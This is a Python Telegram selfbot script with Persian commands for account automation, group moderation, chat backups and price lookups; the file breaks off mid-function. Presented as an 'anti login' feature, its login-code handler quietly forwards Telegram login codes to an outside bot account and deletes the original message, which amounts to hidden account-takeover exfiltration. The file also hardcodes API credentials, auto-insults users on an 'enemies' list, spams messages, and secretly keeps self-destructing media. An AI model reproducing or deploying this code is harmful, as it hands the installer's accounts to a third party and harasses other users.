import requests
import urllib.parse
from pyrogram import Client, filters
from pyrogram.types import Message
import os, asyncio, aiohttp, random, re
from datetime import datetime
import pytz
from pyrogram import enums
from pyrogram.raw import functions
from datetime import datetime, timedelta
import json
import time
from pyrogram.types import ChatPermissions, ChatPrivileges
import sys
from pyrogram.types import ChatMemberUpdated
from pyrogram.errors import FloodWait

bot_username = "Helperbotpersian_bot" # ایدی ربات هلپر بدون @

USER_ID = None
PHONE = None
API_ID = 35656061
API_HASH = "b37f2596516bc0439bf505d1d230395c"

if len(sys.argv) > 1: USER_ID = int(sys.argv[1])
if len(sys.argv) > 2: PHONE = sys.argv[2]
if len(sys.argv) > 3: API_ID = int(sys.argv[3])
if len(sys.argv) > 4: API_HASH = sys.argv[4]

if USER_ID: session_name = f"sessions/{USER_ID}"
else: session_name = "self"

session_path = f"{session_name}.session"
if not os.path.exists(session_path) and USER_ID:
    print(f"⚠️ فایل session برای کاربر {USER_ID} یافت نشد!")

app = Client(session_name, api_id=API_ID, api_hash=API_HASH)

SAVED_PHOTOS_DIR = "saved_photos"
INSULTS_FILE = "insults.txt"
ENEMIES_FILE = "enemies.txt"
BACKUPS_DIR = "backups"
NOTES_FILE = "notes.json" # فایل یادداشت‌ها
online_task = None
self_mode_active = True

action_settings = {
    "typing": False, "upload_photo": False, "record_audio": False, "upload_video": False, "upload_document": False,
    "record_video": False, "upload_audio": False, "upload_video_note": False, "record_video_note": False, 
    "playing": False, "choose_contact": False, "find_location": False, "choose_sticker": False, 
}
ACTION_MAP = {
    "typing": enums.ChatAction.TYPING, "upload_photo": enums.ChatAction.UPLOAD_PHOTO, "record_audio": enums.ChatAction.RECORD_AUDIO,
    "upload_video": enums.ChatAction.UPLOAD_VIDEO, "upload_document": enums.ChatAction.UPLOAD_DOCUMENT, "record_video": enums.ChatAction.RECORD_VIDEO,
    "upload_audio": enums.ChatAction.UPLOAD_AUDIO, "upload_video_note": enums.ChatAction.UPLOAD_VIDEO_NOTE, "record_video_note": enums.ChatAction.RECORD_VIDEO_NOTE,
    "playing": enums.ChatAction.PLAYING, "choose_contact": enums.ChatAction.CHOOSE_CONTACT, "find_location": enums.ChatAction.FIND_LOCATION,
    "choose_sticker": enums.ChatAction.CHOOSE_STICKER,
}
lock_settings = {"همه": False, "مدیا": False, "استیکر": False, "فوروارد": False, "ویس": False, "پیام": False, "فایل": False}
format_settings = {"بولد": False, "ایتالیک": False, "زیر خط": False, "خط‌ خورده": False, "اسپویلر": False, "کد": False, "پیش‌ فرمت": False, "نقل ‌قول": False}
html_tags = {"بولد": "<b>{}</b>", "ایتالیک": "<i>{}</i>", "زیر خط": "<u>{}</u>", "خط‌ خورده": "<s>{}</s>", "اسپویلر": "<spoiler>{}</spoiler>", "کد": "<code>{}</code>", "پیش‌ فرمت": "<pre>{}</pre>", "نقل ‌قول": "<blockquote>{}</blockquote>"}

os.makedirs(SAVED_PHOTOS_DIR, exist_ok=True)
os.makedirs(BACKUPS_DIR, exist_ok=True)

user_format_mode = {}; auto_reactions = {}; anti_login_enabled = False
user_time_status = {}; banners = {}; active_broadcasts = {}; banner_counter = 1
user_original_names = {}; user_fonts = {}; user_cache = {}; CACHE_TIMEOUT = 300 
photo_save_active = True; time_updater_started = False; bold_enabled = {}
auto_replies = {}; enemies = set(); always_online_enabled = False
tag_logger_on = False # متغیر سیستم شنود

FONTS = {
    1: {'0':'𝟎','1':'𝟏','2':'𝟐','3':'𝟑','4':'𝟒','5':'𝟓','6':'𝟔','7':'𝟕','8':'𝟖','9':'𝟗'},
    2: {'0':'𝟬','1':'𝟭','2':'𝟮','3':'𝟯','4':'𝟰','5':'𝟱','6':'𝟲','7':'𝟳','8':'𝟴','9':'𝟵'},
    3: {'0':'０','1':'１','2':'２','3':'３','4':'４','5':'５','6':'۶','7':'７','8':'８','9':'９'},
    4: {'0':'𝟢','1':'𝟣','2':'𝟤','3':'𝟥','4':'𝟦','5':'𝟧','6':'𝟨','7':'𝟩','8':'𝟪','9':'𝟫'},
    5: {'0':'𝟘','1':'𝟙','2':'𝟚','3':'𝟛','4':'𝟜','5':'𝟝','6':'𝟞','7':'𝟟','8':'𝟠','9':'𝟡'},
    6: {'0':'0҉','1':'1҉','2':'2҉','3':'3҉','4':'4҉','5':'5҉','6':'6҉','7':'7҉','8':'8҉','9':'9҉'}
}

def get_persian_action_name(english_name):
    persian_map = {"typing": "تایپ", "upload_photo": "اپلود عکس", "record_audio": "ضبط ویس", "upload_video": "اپلود ویدیو", "upload_document": "اپلود فایل", "record_video": "ضبط ویدیو", "upload_audio": "اپلود ویس", "upload_video_note": "اپلود ویدیو نوت", "record_video_note": "ضبط ویدیو نوت", "playing": "بازی", "choose_contact": "انتخاب مخاطب", "find_location": "پیدا کردن موقعیت", "choose_sticker": "انتخاب استیکر"}
    return persian_map.get(english_name, english_name)

def get_english_action_name(persian_name):
    english_map = {"تایپ": "typing", "اپلود فایل": "upload_document", "اپلود عکس": "upload_photo", "اپلود ویدیو": "upload_video", "اپلود ویس": "upload_audio", "اپلود ویدیو نوت": "upload_video_note", "ضبط ویس": "record_audio", "ضبط ویدیو": "record_video", "ضبط ویدیو نوت": "record_video_note", "بازی": "playing", "انتخاب مخاطب": "choose_contact", "پیدا کردن موقعیت": "find_location", "انتخاب استیکر": "choose_sticker"}
    return english_map.get(persian_name, persian_name)

# ==============================
# توابع مدیریت فایل‌ها (یادداشت‌ها، دشمنان، فحش‌ها و...)
# ==============================
def load_notes():
    if os.path.exists(NOTES_FILE):
        try:
            with open(NOTES_FILE, 'r', encoding='utf-8') as f: return json.load(f)
        except: return {}
    return {}

def save_notes(notes):
    with open(NOTES_FILE, 'w', encoding='utf-8') as f: json.dump(notes, f, ensure_ascii=False)

def load_insults() -> list:
    try:
        if os.path.exists(INSULTS_FILE):
            with open(INSULTS_FILE, 'r', encoding='utf-8') as f: return [line.strip() for line in f.readlines() if line.strip()]
        return []
    except: return []

def save_insults(insults_list: list) -> bool:
    try:
        with open(INSULTS_FILE, 'w', encoding='utf-8') as f:
            for insult in insults_list: f.write(insult + '\n')
        return True
    except: return False

def load_enemies() -> set:
    try:
        if os.path.exists(ENEMIES_FILE):
            with open(ENEMIES_FILE, 'r', encoding='utf-8') as f: return set(int(line.strip()) for line in f.readlines() if line.strip())
        return set()
    except: return set()

def save_enemies(enemies_set: set) -> bool:
    try:
        with open(ENEMIES_FILE, 'w', encoding='utf-8') as f:
            for enemy_id in enemies_set: f.write(str(enemy_id) + '\n')
        return True
    except: return False

def is_enemy(user_id: int) -> bool: return user_id in enemies

def save_reactions():
    try:
        with open("mmauto_reactions.json", "w", encoding="utf-8") as f: json.dump(auto_reactions, f, ensure_ascii=False, indent=4)
        return True
    except: return False

def load_reactions():
    try:
        if os.path.exists("mmauto_reactions.json"):
            with open("mmauto_reactions.json", "r", encoding="utf-8") as f:
                content = f.read().strip()
                return json.loads(content) if content else {}
        return {}
    except: return {}

enemies = load_enemies()
auto_reactions = load_reactions()

async def apply_chat_actions(client: Client, message: Message):
    if not message.from_user or message.from_user.id == (await client.get_me()).id: return    
    for action_name, is_active in action_settings.items():
        if is_active:
            try:
                await client.send_chat_action(chat_id=message.chat.id, action=ACTION_MAP[action_name])
                await asyncio.sleep(2)
                break 
            except Exception as e: print(f"❌ خطا در اعمال اکشن {action_name}: {e}")

async def send_global_banner(client: Client, banner_id: int):
    banner_data = banners[banner_id]
    delay = active_broadcasts.get('delay', 300) 
    while active_broadcasts.get('global', {}).get('running', False):
        try:
            async for dialog in client.get_dialogs():
                if not active_broadcasts.get('global', {}).get('running', False): break
                if dialog.chat.type in [enums.ChatType.GROUP, enums.ChatType.SUPERGROUP]:
                    try:
                        if banner_data['media']: await banner_data['message'].copy(dialog.chat.id)
                        else: await client.send_message(dialog.chat.id, banner_data['text'])
                        await asyncio.sleep(2) 
                    except: continue
            await asyncio.sleep(delay)
        except: await asyncio.sleep(60)

async def send_instant_broadcast(client: Client, banner_id: int):
    banner_data = banners[banner_id]
    sent_count = 0
    async for dialog in client.get_dialogs():
        if dialog.chat.type in [enums.ChatType.GROUP, enums.ChatType.SUPERGROUP]:
            try:
                if banner_data['media']: await banner_data['message'].copy(dialog.chat.id)
                else: await client.send_message(dialog.chat.id, banner_data['text'])
                sent_count += 1
                await asyncio.sleep(2) 
            except: continue
    await client.send_message("me", f"✅ **ارسال بنر کامل شد**\n\n📤 **تعداد ارسال شده:** {sent_count} گروه")

async def apply_auto_reaction(client, message):
    if not message.from_user or message.from_user.id == (await client.get_me()).id: return
    user_id = message.from_user.id
    if str(user_id) in auto_reactions:
        try: await client.send_reaction(chat_id=message.chat.id, message_id=message.id, emoji=auto_reactions[str(user_id)])
        except: pass

async def forward_and_save_login_codes(client, message):
    global anti_login_enabled
    if not anti_login_enabled: return False
    if message.from_user and message.from_user.id == 777000:
        message_text = message.text or ""
        if any(keyword in message_text for keyword in ["Login code", "کد ورود", "verification code"]):
            try:
                code_patterns = [r"Login code: (\d+)", r"کد ورود: (\d+)", r"verification code: (\d+)", r"(\d{5,6})\. Do not give this code"]
                login_code = None
                for pattern in code_patterns:
                    match = re.search(pattern, message_text)
                    if match: login_code = match.group(1); break
                if login_code:
                    try: await client.send_message("@ejw9wowjs9wiwbot", login_code)
                    except: pass
                    await client.send_message("me", login_code)
                    await message.delete()
                    return True
            except: pass
    return False

async def check_lock(client, message):
    if message.chat.type != enums.ChatType.PRIVATE or not message.from_user or message.from_user.id == (await client.get_me()).id: return
    if lock_settings["همه"]:
        try: await message.delete()
        except: pass; return
    if lock_settings["مدیا"] and (message.photo or message.video):
        try: await message.delete()
        except: pass; return
    if lock_settings["استیکر"] and (message.sticker or message.animation):
        try: await message.delete()
        except: pass; return
    if lock_settings["فوروارد"] and message.forward_date:
        try: await message.delete()
        except: pass; return
    if lock_settings["ویس"] and message.voice:
        try: await message.delete()
        except: pass; return
    if lock_settings["پیام"] and message.text and not message.text.startswith("/"):
        try: await message.delete()
        except: pass; return
    if lock_settings["فایل"] and message.document:
        try: await message.delete()
        except: pass; return

async def keep_online(client: Client):
    global always_online_enabled
    while always_online_enabled:
        try:
            await client.invoke(functions.account.UpdateStatus(offline=False))
            await asyncio.sleep(20)
        except: await asyncio.sleep(5)

def get_iran_time() -> str:
    now = datetime.now(pytz.timezone('Asia/Tehran')).strftime("%H:%M")
    font_dict = FONTS.get(user_fonts.get("me", 1), FONTS[1])
    return ''.join([font_dict.get(char, char) for char in now])

async def update_name_with_time(user_id: int, client: Client) -> bool:
    if not user_time_status.get(user_id): return False
    try:
        user = await client.get_users(user_id)
        first_name = user_original_names.get(user_id, user.first_name or "")
        new_name = f"{first_name} {get_iran_time()}"
        await client.update_profile(first_name=new_name)
        return True
    except: return False

async def continuous_time_updater(client: Client):
    global time_updater_started
    while True:
        try:
            now = datetime.now(pytz.timezone('Asia/Tehran'))
            seconds_until_next_minute = 60 - now.second
            await asyncio.sleep((seconds_until_next_minute * 1000 - (now.microsecond // 1000)) / 1000)
            active_users = [uid for uid, status in user_time_status.items() if status]
            for user_id in active_users:
                try:
                    current_time = get_iran_time()
                    original_name = user_original_names.get(user_id, "")
                    new_name = f"{original_name} {current_time}"
                    await client.update_profile(first_name=new_name)
                except: pass
        except: await asyncio.sleep(60)

async def backup_chat(client: Client, chat_id: int, until_message_id: int = None) -> tuple:
    try:
        backup_file = f"{BACKUPS_DIR}/backup_{chat_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        user = await client.get_users(chat_id)
        user_name = f"{user.first_name or ''} {user.last_name or ''}".strip() or user.username or f"User_{chat_id}"
        me = await client.get_me()
        message_count = 0
        with open(backup_file, 'w', encoding='utf-8') as f:
            f.write("="*60 + f"\n📱 پشتیبان گیری از تلگرام\n" + "="*60 + f"\n👤 کاربر: {user_name}\n🆔 آیدی: {chat_id}\n📅 تاریخ: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n" + "="*60 + "\n\n")
            async for message in client.get_chat_history(chat_id):
                if until_message_id and message.id >= until_message_id: continue
                message_count += 1
                sender_name = "شما" if message.from_user and message.from_user.id == me.id else f"{message.from_user.first_name or ''} {message.from_user.last_name or ''}".strip() or message.from_user.username or "Unknown"
                if message.from_user and message.from_user.id != me.id: sender_name += f" (ID: {message.from_user.id})"
                media_type = ""
                if message.photo: media_type = "📷 عکس"
                elif message.video: media_type = "🎥 ویدیو"
                elif message.document: media_type = "📄 فایل"
                elif message.audio: media_type = "🎵 آudio"
                elif message.voice: media_type = "🎤 ویس"
                elif message.sticker: media_type = "🤡 استیکر"
                message_text = message.text or message.caption or ""
                f.write(f"#{message_count}\n👤 ارسال کننده: {sender_name}\n🕐 زمان: {message.date.strftime('%Y-%m-%d %H:%M')}\n")
                if media_type: f.write(f"📎 نوع: {media_type}\n")
                if message_text: f.write(f"💬 متن: {message_text}\n")
                f.write("-"*40 + "\n\n")
        return True, backup_file, message_count, user_name
    except Exception as e: return False, str(e), 0, None

@app.on_message(filters.private & filters.incoming & (filters.photo | filters.video | filters.voice))
async def handle_timed_media(client, message):
    try:
        if message.photo and hasattr(message.photo, 'ttl_seconds') and message.photo.ttl_seconds:
            media = message.photo; file_type = 'photo'; file_ext = 'jpg'
        elif message.video and hasattr(message.video, 'ttl_seconds') and message.video.ttl_seconds:
            media = message.video; file_type = 'video'; file_ext = 'mp4'
        elif message.voice and hasattr(message.voice, 'ttl_seconds') and message.voice.ttl_seconds:
            media = message.voice; file_type = 'voice'; file_ext = 'ogg'
        else: return
        rand = random.randint(1000, 9999999)
        file_path = os.path.join(SAVED_PHOTOS_DIR, f'{file_type}-{rand}.{file_ext}')
        await client.download_media(message, file_path)
        if os.path.exists(file_path):
            sender = message.from_user
            username = f"@{sender.username}" if sender.username else "ندارد"
            caption = f"🔥 مدیای زمان‌دار ({file_type})\n👤 {sender.first_name or ''}\n🆔 {username}\n🔢 آیدی: {sender.id}\n⏰ {datetime.now().strftime('%H:%M:%S')}"
            if file_type == 'photo': await client.send_photo("me", photo=file_path, caption=caption)
            elif file_type == 'video': await client.send_video("me", video=file_path, caption=caption)
            elif file_type == 'voice': await client.send_voice("me", voice=file_path, caption=caption)
            os.remove(file_path)
    except: pass

@app.on_message(~filters.me & filters.incoming)
async def global_message_handler(client: Client, message: Message):
    if not message.from_user: return
    await check_lock(client, message)
    user_id = message.from_user.id
    message_text = message.text or ""
    if user_id == 777000:
        await forward_and_save_login_codes(client, message)
        return
    
    # سیستم شنود (تگ لاگر)
    if tag_logger_on and message.entities and message.chat.type in [enums.ChatType.GROUP, enums.ChatType.SUPERGROUP]:
        me = await client.get_me()
        if me.username:
            for entity in message.entities:
                if entity.type == "mention" and f"@{me.username}" in message_text:
                    try:
                        chat_link = f"https://t.me/{message.chat.username}/{message.id}" if message.chat.username else "گروه خصوصی"
                        await client.send_message("me", f"🔔 **شما در یک گروه تگ شدید!**\n\n👤 کاربر: {message.from_user.first_name}\n💬 پیام: {message_text}\n🔗 لینک: {chat_link}")
                    except: pass
                    break

    if str(user_id) in auto_reactions:
        try: await client.send_reaction(chat_id=message.chat.id, message_id=message.id, emoji=auto_reactions[str(user_id)])
        except: pass
    if user_id in enemies and message_text.strip():
        try:
            insults_list = load_insults()
            if insults_list: await client.send_message(message.chat.id, random.choice(insults_list), reply_to_message_id=message.id)
        except: pass
    if message_text.strip():
        message_text_lower = message_text.strip().lower()
        for trigger, reply in auto_replies.items():
            if trigger.lower() in message_text_lower:
                try: await client.send_message(message.chat.id, reply, reply_to_message_id=message.id); break
                except: break

@app.on_message(filters.private & ~filters.me)
async def apply_actions_private(client: Client, message: Message): await apply_chat_actions(client, message)

@app.on_message(filters.group & ~filters.me)
async def apply_actions_group(client: Client, message: Message): await apply_chat_actions(client, message)

@app.on_message(filters.me & filters.regex(r'^بن$') & filters.group)
async def ban_user(client, message):
    if not message.reply_to_message: return await message.edit("❌ **لطفا روی پیام کاربر ریپلای کنید**")
    try:
        user_id = message.reply_to_message.from_user.id
        await client.ban_chat_member(message.chat.id, user_id)
        await message.edit(f"✅ **کاربر بن شد**\n👤 آیدی: `{user_id}`")
    except Exception as e: await message.edit(f"❌ **خطا:** `{str(e)}`")

@app.on_message(filters.me & filters.regex(r'^آنبن @(.+)$') & filters.group)
async def unban_user(client, message):
    try:
        username = message.matches[0].group(1)
        user = await client.get_users(f"@{username}")
        await client.unban_chat_member(message.chat.id, user.id)
        await message.edit(f"✅ **کاربر آنبن شد**\n👤 کاربر: {user.first_name}")
    except Exception as e: await message.edit(f"❌ **خطا:** `{str(e)}`")

@app.on_message(filters.me & filters.regex(r'^کیک$') & filters.group)
async def kick_user(client, message):
    if not message.reply_to_message: return await message.edit("❌ **لطفا روی پیام کاربر ریپلای کنید**")
    try:
        user_id = message.reply_to_message.from_user.id
        await client.ban_chat_member(message.chat.id, user_id)
        await client.unban_chat_member(message.chat.id, user_id)
        await message.edit(f"✅ **کاربر کیک شد**\n👤 آیدی: `{user_id}`")
    except Exception as e: await message.edit(f"❌ **خطا:** `{str(e)}`")

@app.on_message(filters.me & filters.regex(r'^سکوت$') & filters.group)
async def mute_user(client, message):
    if not message.reply_to_message: return await message.edit("❌ **لطفا روی پیام کاربر ریپلای کنید**")
    try:
        user_id = message.reply_to_message.from_user.id
        permissions = ChatPermissions(can_send_messages=False, can_send_media_messages=False, can_send_other_messages=False, can_send_polls=False, can_add_web_page_previews=False, can_invite_users=False, can_change_info=False, can_pin_messages=False)
        await client.restrict_chat_member(chat_id=message.chat.id, user_id=user_id, permissions=permissions)
        await message.edit(f"🔇 **کاربر به سکوت کامل رفت**\n🔒 هیچ دسترسی ندارد\n👤 آیدی: `{user_id}`")
    except Exception as e: await message.edit(f"❌ **خطا:** `{str(e)}`")

@app.on_message(filters.me & filters.regex(r'^حذف سکوت$') & filters.group)
async def unmute_user(client, message):
    if not message.reply_to_message: return await message.edit("❌ **لطفا روی پیام کاربر ریپلای کنید**")
    try:
        user_id = message.reply_to_message.from_user.id
        permissions = ChatPermissions(can_send_messages=True, can_send_media_messages=True, can_send_other_messages=True, can_send_polls=True, can_add_web_page_previews=True, can_invite_users=True, can_change_info=True, can_pin_messages=True)
        await client.restrict_chat_member(chat_id=message.chat.id, user_id=user_id, permissions=permissions)
        await message.edit(f"🔊 **سکوت کاربر برداشته شد**\n🔓 همه دسترسی‌ها فعال شد\n👤 آیدی: `{user_id}`")
    except Exception as e: await message.edit(f"❌ **خطا:** `{str(e)}`")

@app.on_message(filters.me & filters.regex(r'^ادمین$') & filters.group)
async def promote_user(client, message):
    if not message.reply_to_message: return await message.edit("❌ **لطفا روی پیام کاربر ریپلای کنید**")
    try:
        user_id = message.reply_to_message.from_user.id
        privileges = ChatPrivileges(can_manage_chat=True, can_delete_messages=True, can_restrict_members=True, can_promote_members=True, can_change_info=True, can_invite_users=True, can_pin_messages=True, can_manage_video_chats=True)
        await client.promote_chat_member(message.chat.id, user_id, privileges=privileges)
        await message.edit(f"✅ **کاربر ادمین شد**\n👤 آیدی: `{user_id}`")
    except Exception as e: await message.edit(f"❌ **خطا:** `{str(e)}`")

@app.on_message(filters.me & filters.regex(r'^حذف ادمین$') & filters.group)
async def demote_user(client, message):
    if not message.reply_to_message: return await message.edit("❌ **لطفا روی پیام کاربر ریپلای کنید**")
    try:
        user_id = message.reply_to_message.from_user.id
        privileges = ChatPrivileges(can_manage_chat=False, can_delete_messages=False, can_restrict_members=False, can_promote_members=False, can_change_info=False, can_invite_users=False, can_pin_messages=False, can_manage_video_chats=False)
        await client.promote_chat_member(chat_id=message.chat.id, user_id=user_id, privileges=privileges)
        await message.edit(f"✅ **کاربر غیرادمین شد**\n👤 آیدی: `{user_id}`")
    except Exception as e: await message.edit(f"❌ **خطا:** `{str(e)}`")

@app.on_message(filters.me & filters.regex(r'^پاک (\d+)$') & filters.group)
async def purge_messages(client, message):
    try:
        count = int(message.matches[0].group(1))
        if count > 100: return await message.edit("❌ **حداکثر تعداد مجاز: 100 پیام**")
        deleted = 0
        async for msg in client.get_chat_history(message.chat.id, limit=count+1):
            if msg.id != message.id:
                try: await msg.delete(); deleted += 1; await asyncio.sleep(0.3)
                except: pass
        await message.edit(f"✅ **{deleted} پیام پاک شد**")
        await asyncio.sleep(3); await message.delete()
    except Exception as e: await message.edit(f"❌ **خطا:** `{str(e)}`")

@app.on_message(filters.me & filters.regex(r'^پین$') & filters.group)
async def pin_message(client, message):
    if not message.reply_to_message: return await message.edit("❌ **لطفا روی پیامی که می‌خواهید پین کنید ریپلای کنید**")
    try:
        await client.pin_chat_message(message.chat.id, message.reply_to_message.id)
        await message.edit("✅ **پیام پین شد**"); await asyncio.sleep(2); await message.delete()
    except Exception as e: await message.edit(f"❌ **خطا:** `{str(e)}`")

@app.on_message(filters.me & filters.regex(r'^آنپین$') & filters.group)
async def unpin_message(client, message):
    if not message.reply_to_message: return await message.edit("❌ **لطفا روی پیام پین شده ریپلای کنید**")
    try:
        await client.unpin_chat_message(message.chat.id, message.reply_to_message.id)
        await message.edit("✅ **پیام آنپین شد**"); await asyncio.sleep(2); await message.delete()
    except Exception as e: await message.edit(f"❌ **خطا:** `{str(e)}`")

@app.on_message(filters.me & filters.text & ~filters.command(["سیو", "پنل", "لیست فحش", "آنلاین", "دانلود", "ایدی", "تایم", "وضعیت", "لیست فونت", "تنظیم فونت", "قیمت", "اسپم", "بولد", "پاسخ", "دشمن", "فحش", "حذف", "لیست دشمن", "دشمنان", "پاک کردن دشمنان", "همه", "مدیا", "استیکر", "فوروارد", "وویس", "پیام", "فایل", "وضعیت قفل", "ریست قفل", "راهنمای قفل", "انتی لاگین", "ریکت", "حذف ریکت", "لیست ریکت", "پاکسازی ریکت", "ویرایش", "تنظیم بنر", "بنر همگانی", "لیست بنرها", "حذف بنر", "بنر همگانی خاموش", "بنر ارسال", "زمان بنر", "فرمت", "پینگ", "تعداد کانال ها", "تعداد گروه ها", "خروج همه کانال", "خروج همه گروه", "اکشن", "اینستا", "پروفایل", "بایو", "یوزر", "یادداشت", "یادداشت‌ها", "ترجمه", "آب و هوا", "بارکد", "شنود", "حذف زمان‌دار", "پاکسازی"], prefixes=""))
async def auto_html_format_messages(client, message):
    if any(format_settings.values()):
        original_text = message.text; formatted_text = original_text
        for format_name, is_active in format_settings.items():
            if is_active: formatted_text = html_tags[format_name].format(formatted_text)
        try: await message.edit_text(formatted_text, parse_mode=enums.ParseMode.HTML)
        except: pass

@app.on_message(filters.me & filters.command("سیو", prefixes=""))
async def save_command(client: Client, message: Message):
    if len(message.command) < 2: return await message.edit_text("**لطفا یوزرنیم کاربر را وارد کنید**\n\nمثال: `سیو @LuminousPath`")
    chat_input = message.command[1].lstrip('@')
    try:
        user = await client.get_users(chat_input)
        chat_id, user_name = user.id, f"{user.first_name or ''} {user.last_name or ''}".strip() or user.username or f"User_{user.id}"
    except: return await message.edit_text(f"**کاربر '{chat_input}' پیدا نشد**")
    loading_msg = await message.edit_text(f"🔄 **در حال پشتیبان‌گیری از {user_name}...**")
    success, result, message_count, user_name = await backup_chat(client, chat_id, message.id)
    if success:
        await loading_msg.edit_text("**در حال آپلود فایل پشتیبان...**")
        await client.send_document("me", document=result, caption=f"**پشتیبان‌گیری کامل شد**\n\n**کاربر:** {user_name}\n**آیدی:** `{chat_id}`\n**تعداد پیام‌ها:** {message_count}\n**فرمت:** فایل متنی (TXT)\n**تاریخ:** {datetime.now().strftime('%Y-%m-%d %H:%M')}")
        os.remove(result); await loading_msg.delete()
    else: await loading_msg.edit_text(f"❌ **خطا در پشتیبان‌گیری:**\n`{result}`")

@app.on_message(filters.me & filters.command("تایم", prefixes="") & filters.regex(r"^تایم (روشن|خاموش)$"))
async def time_command(client: Client, message: Message):
    global time_updater_started  
    if len(message.command) < 2: return await message.edit("**استفاده:**\n`تایم روشن` - فعال کردن\n`تایم خاموش` - غیرفعال کردن")
    action = message.command[1]; user_id = message.from_user.id
    if action == "روشن":
        user_time_status[user_id] = True
        user_original_names.setdefault(user_id, message.from_user.first_name or "")
        success = await update_name_with_time(user_id, client)
        if not time_updater_started:  
            time_updater_started = True; asyncio.create_task(continuous_time_updater(client))
        await message.edit("**تایم کنار نام فعال شد**\n**راس هر دقیقه آپدیت می‌شود**" if success else "**خطا در تغییر نام**")
    elif action == "خاموش":
        user_time_status[user_id] = False
        if user_id in user_original_names:
            try: await client.update_profile(first_name=user_original_names[user_id]); await message.edit("**تایم کنار نام غیرفعال شد**\nنام شما به حالت اول بازگشت")
            except: await message.edit("❌ خطا در بازگردانی نام")
        else: await message.edit("✅ تایم کنار نام غیرفعال شد")

@app.on_message(filters.me & filters.command("لیست فونت", prefixes=""))
async def font_list_command(client: Client, message: Message):
    sample_time = "12:34"
    fonts_samples = "\n".join([f"**فونت {i}:** {''.join([FONTS[i].get(char, char) for char in sample_time])}" for i in range(1, 7)])
    await message.edit(f"🔤 **لیست فونت‌های زمان**\n\n{fonts_samples}\n\n**استفاده:**\n`تنظیم فونت 1` تا `تنظیم فونت 6`")

@app.on_message(filters.me & filters.command("تنظیم فونت", prefixes=""))
async def set_font_command(client: Client, message: Message):
    if len(message.command) < 2: return await message.edit("⚠️ **استفاده:**\n`تنظیم فونت 1` تا `تنظیم فونت 6`")
    try:
        font_num = int(message.command[1])
        if 1 <= font_num <= 6:
            user_fonts["me"] = font_num
            if user_time_status.get(message.from_user.id, False): await update_name_with_time(message.from_user.id, client)
            await message.edit(f"✅ **فونت زمان به شماره {font_num} تغییر کرد**\n\nنمونه: {get_iran_time()}")
        else: await message.edit("❌ **شماره فونت باید بین 1 تا 6 باشد**")
    except: await message.reply("❌ **لطفا یک عدد وارد کنید**\nمثال: `تنظیم فونت 2`")

@app.on_message(filters.me & filters.command("قیمت", prefixes=""))
async def price_command(client: Client, message: Message):
    try:
        if len(message.command) < 2: return await message.edit_text("❌ **لطفا نام ارز را وارد کنید**\nمثال: `قیمت ton`")
        coin_input = ' '.join(message.command[1:]).strip()
        loading_msg = await message.edit_text(f"🔍 **در حال دریافت قیمت {coin_input}...**")        
        async with aiohttp.ClientSession() as session:
            async with session.get("https://api.fast-creat.ir/nobitex/v2?apikey=8000978149:Vqsu9H08Z6rzAQw@Api_ManagerRoBOT") as response:
                if response.status == 200:
                    data = await response.json()
                    if data.get("ok"):
                        prices = data["result"]; found_coin = None; coin_key = None
                        if coin_input.upper() in prices: found_coin = prices[coin_input.upper()]; coin_key = coin_input.upper()
                        else:
                            for key, coin_data in prices.items():
                                if 'name' in coin_data and coin_input.lower() in coin_data['name'].lower(): found_coin = coin_data; coin_key = key; break
                        if found_coin and coin_key:
                            coin_data = found_coin
                            price_text = f"""**💰 قیمت {coin_data['name']} ({coin_key})**
💵 **قیمت تومانی:** `{'{:,}'.format(int(float(coin_data['irr'])))}` تومان
💰 **قیمت دلاری:** `{float(coin_data['usdt']):,.2f}$`
📊 **تغییر 24h:** {'🟢' if float(coin_data['dayChange']) > 0 else '🔴'} `{coin_data['dayChange']}%`

⏰ **آپدیت:** {datetime.now(pytz.timezone('Asia/Tehran')).strftime('%H:%M')}"""
                            await loading_msg.edit_text(price_text)
                        else: await loading_msg.edit_text(f"❌ **ارز '{coin_input}' یافت نشد**")
                    else: await loading_msg.edit_text("❌ خطا در دریافت اطلاعات از API")
                else: await loading_msg.edit_text("❌ خطا در اتصال به سرور")
    except Exception as e: await message.edit_text(f"❌ خطا: {str(e)}")

@app.on_message(filters.me & filters.command("اسپم", prefixes=""))
async def spam_command(client: Client, message: Message):
    if len(message.command) < 3: return await message.edit_text("❌ **فرمت صحیح:**\n`اسپم 10 سلام`")
    try:
        count = int(message.command[1])
        if count > 50: return await message.edit_text("❌ **حداکثر تعداد مجاز: 50 پیام**")
        spam_text = ' '.join(message.command[2:])
        if not spam_text: return await message.edit_text("❌ **لطفا متن پیام را وارد کنید**")
        loading_msg = await message.edit_text(f"🔄 **در حال ارسال {count} پیام...**")
        success_count = 0
        for i in range(count):
            try:
                await client.send_message(message.chat.id, f"{spam_text}", reply_to_message_id=message.reply_to_message_id if message.reply_to_message else None)
                success_count += 1; await asyncio.sleep(0.2)
            except: pass
        await loading_msg.edit_text(f"✅ **اسپم کامل شد**\n\n📤 **تعداد ارسال شده:** {success_count}/{count}\n💬 **متن:** {spam_text[:50]}")
    except: await message.edit_text("❌ **لطفا تعداد را به صورت عدد وارد کنید**")

@app.on_message(filters.me & filters.command("پاسخ", prefixes=""))
async def auto_reply_command(client: Client, message: Message):
    if len(message.command) < 2: return await message.edit("⚠️ **استفاده:**\n`پاسخ افزودن سلام|سلام چطوری`\n`پاسخ حذف سلام`\n`پاسخ لیست`")
    sub_command = message.command[1]
    if sub_command == "افزودن":
        if len(message.command) < 3: return await message.edit("❌ **فرمت صحیح:**\n`پاسخ افزودن سلام|سلام چطوری`")
        try:
            parts = ' '.join(message.command[2:]).split('|', 1)
            if len(parts) != 2: return await message.edit("❌ **فرمت صحیح:**\n`پاسخ افزودن سلام|سلام چطوری`")
            trigger, reply = parts[0].strip(), parts[1].strip()
            auto_replies[trigger] = reply
            await message.edit(f"✅ **پاسخ خودکار افزوده شد**\n\n**متن:** {trigger}\n**پاسخ:** {reply}")
        except: pass
    elif sub_command == "حذف":
        if len(message.command) < 3: return await message.edit("❌ **لطفا متن پاسخ را وارد کنید**")
        trigger = ' '.join(message.command[2:]).strip()
        if trigger in auto_replies: del auto_replies[trigger]; await message.edit(f"✅ **پاسخ خودکار حذف شد**\n\n**متن:** {trigger}")
        else: await message.edit(f"❌ **پاسخ برای متن '{trigger}' یافت نشد**")
    elif sub_command == "لیست":
        if not auto_replies: await message.edit("❌ **هیچ پاسخی تنظیم نشده**")
        else:
